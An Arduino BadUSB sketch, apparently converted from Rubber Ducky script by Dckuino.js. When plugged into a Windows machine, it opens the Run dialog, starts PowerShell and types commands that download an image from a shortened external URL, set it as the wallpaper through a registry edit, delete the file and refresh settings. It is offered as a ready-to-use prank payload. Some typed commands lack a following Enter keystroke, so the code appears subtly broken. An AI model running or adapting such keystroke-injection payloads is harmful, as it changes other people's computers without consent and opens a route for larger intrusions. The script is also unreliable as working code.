/*
 * Generated with <3 by Dckuino.js, an open source project !
 * 
 * THERE ARE 2 IMAGES YOU CAN USE OUT OF THE BOX.
 * PLEASE, ONLY USE 1 OF THEM, NOT BOTH
 * TO USE IMAGE 1, COMMENT LINE 51 AND UNCOMMENT LINE 48
 * TO USE IMAGE 2, COMMENT LINE 48 AND UNCOMMENT LINE 51
 *                      HAVE FUN!
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  // IMAGE 1
  Keyboard.print("Invoke-RestMethod -Uri http://zip.net/bxtGy1 -OutFile o951.png");
  
  // IMAGE 2
  // Keyboard.print("Invoke-RestMethod -Uri http://zip.net/bdtF9n -OutFile o951.png");

  delay(1000);

  Keyboard.print("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d  o951.png /f");

  delay(1000);

  Keyboard.print("del .\\o951.png");

  delay(500);

  Keyboard.print("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
